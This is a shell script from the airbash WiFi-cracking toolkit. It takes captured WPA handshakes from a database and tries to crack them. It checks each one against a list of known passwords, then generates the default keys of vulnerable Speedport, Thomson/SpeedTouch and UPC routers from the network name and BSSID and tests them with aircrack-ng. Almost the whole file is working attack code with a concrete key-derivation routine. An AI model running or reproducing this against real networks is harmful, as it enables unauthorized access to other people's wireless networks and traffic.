#!/system/bin/sh
# This script is part of airbash (https://github.com/tehw0lf/airbash)
# Written by tehw0lf
# Execution of this script will search the handshake database for entries
# that have not been cracked yet and then try to match the SSID with
# routers that have known vulnerabilities. Subsequently, the default
# passwords for any found matches are calculated and tested using aircrack-ng (https://aircrack-ng.org)

# configure path and file names
export PATH="$PATH:modules"
path=/path/to/airbash-folder/
hs=.hs/
wl=.wl/
db=.db.sqlite3
IFS=$'\n'
for i in `sqlite3 "$path$db" "SELECT * FROM hs WHERE psk IS NULL AND prcsd IS NULL" 2>/dev/null`; do
	unset IFS
	# get ssids for current handshake
	bssid=`echo "$i" | awk -F '|' '{print $4}'`
	essid=`echo "$i" | awk -F '|' '{print $5}'`

	# check against list of known passwords
	psk=`aircrack-ng "$path$hs$bssid"*.cap -w "$path$wl"known 2>/dev/null | grep FOUND | sort -u | awk '{print $4}'`
	if [ ${#psk} -gt 7 ]; then
		echo "Key found for BSSID $bssid: $psk"
		sqlite3 "$path$db" "UPDATE hs SET psk='$psk', prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
		mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
		continue
	fi

	# check which module applies and set flag accordingly
	isupc=`echo $essid | grep -c -oE 'UPC[0-9]{7}'`
	isthomson=`echo $essid | grep -c -oE 'SpeedTouch[0-9a-zA-Z]{6}'`
	if [[ isthomson -eq 0 ]]; then
		isthomson=`echo $essid | grep -c -oE 'Thomson[0-9a-zA-Z]{6}'`
		tessid=${essid#Thomson}
	else
		tessid=${essid#SpeedTouch}
	fi
	isspeedport=`echo $essid | grep -c -oE 'WLAN-[0-9A-F]{4}[0-9]{2}'`
	#istemplate=`echo $essid | grep -c -oE 'SSIDSTYLE'`

	# modules
	# Speedport 500/700
	# code adapted from https://www.zebradem.com/wiki/index.php?title=Router_Standardpassw%C3%B6rter#.28diverse_Modelle:_500.2C_700.2C_....29
	if [[ isspeedport -gt 0 ]]; then
		echo "Speedport 500/700 detected, computing default keys (1000 keys)"
		# generate keys
		PRE="SP-"
		D=${bssid:13:1}
		E=${bssid:15:1}
		F=${bssid:16:1}
		G=${essid:9:1}
		H=${essid:10:1}
		for X in {0..9}; do
			for Y in {0..9}; do
				for Z in {0..9}; do
					echo $PRE$G$Z$H$D$E$F$X$Y$Z >> "$path"wlspeedport
				done
			done
		done
		# test keys
		psk=`aircrack-ng "$path$hs$bssid"*.cap -w "$path"wlspeedport  2>/dev/null | grep FOUND | grep -oE 'SP-[0-9a-zA-Z]{9}' | sort -u`
		sqlite3 "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
		rm -f "$path"wl* 2>/dev/null
		if [ ${#psk} -gt 7 ]; then
			echo "Key $psk found for BSSID $bssid"
			sqlite3 "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
            echo "$psk" >> "$path$wl"known
			mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
			continue
        fi
	fi

    # Thomson/SpeedTouch
	# this module uses the compiled binary of Kevin Devine's stkeys.c (https://packetstormsecurity.com/files/84788/STKeys-Thomson-WPA-Key-Recovery-Tool-1.0.html)
	# 
    if [[ isthomson -gt 0  ]]; then
        echo "Thomson/SpeedTouch detected, computing default keys for production dates between 2005 and 2009"
		# generate keys
		`st -o "$path"wlthomson -i $tessid`
		# test keys
		psk=`aircrack-ng "$path$hs$bssid"*.cap -w "$path"wlthomson  2>/dev/null | grep FOUND | grep -oE '[0-9a-f]{10}' | sort -u`
		sqlite3 "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
		rm -f "$path"wl* 2>/dev/null
		if [ ${#psk} -gt 7 ]; then
			echo "Key $psk found for BSSID $bssid"
			sqlite3 "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
			echo "$psk" >> "$path$wl"known
			mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
			continue
        fi
	fi

	# UPC 7 digits
	# this module uses the compiled binary of upc_keys.c by <peter@haxx.in> (https://haxx.in/upc_keys.c)
	# to compile it, use gcc -O2 -o modules/upckeys modules/upc_keys.c -lcrypto (requires openssl)
	if [[ isupc -gt 0 ]]; then
		echo "UPC detected, computing default keys"
		# generate keys
		`upckeys "$essid" "24" >> "$path"wlupctmp`
		`upckeys "$essid" "5" >> "$path"wlupctmp`
		# clean program output
		for j in `cat "$path"wlupctmp 2>/dev/null | awk -F\' '{print $4}'`; do
			echo "$j" >> "$path"wlupc
		done
		# test keys
		psk=`aircrack-ng "$path$hs$bssid"*.cap -w "$path"wlupc  2>/dev/null | grep FOUND | grep -oE '[0-9A-Z]{8}' | sort -u`
		sqlite3 "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
		rm -f "$path"wl* 2>/dev/null
		if [ ${#psk} -gt 7 ]; then
			echo "Key $psk found for BSSID $bssid"
			sqlite3 "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
			echo "$psk" >> "$path$wl"known
			mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
			continue
		fi
	fi

	# template for module creation
#	if [[ istemplate -gt 0  ]]; then
#		echo "Template detected, computing default keys"
#		# generate keys
#		`"cli command for 2.4 ghz" >> "$path"wltmplatetmp`
#		`"cli command for 5 ghz if available" >> "$path"wltmplatetmp
#		# clean program output if necessary
#		for j in `cat "$path"wltmplatetmp | "applying awk filter"`; do
#			echo "$j" >> "$path"wltmplate
#		done
#		# test keys
#		psk=`aircrack-ng "$path$hs$bssid"*.cap -w "$path"wltmplate  2>/dev/null | grep FOUND | grep -oE 'charset&length' | sort -u`
#		sqlite3 "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
#		rm -f "$path"wl* 2>/dev/null
#		# insert to db if key recovery successful
#		if [ ${#psk} -gt 7 ]; then
#			echo "Key $psk found for BSSID $bssid"
#			sqlite3 "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
#			echo "$psk" >> "$path$wl"known
#           mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
#			continue
#       fi
#	fi
done
rm -f "$path$hs".cracked/*.cap 2>/dev/null
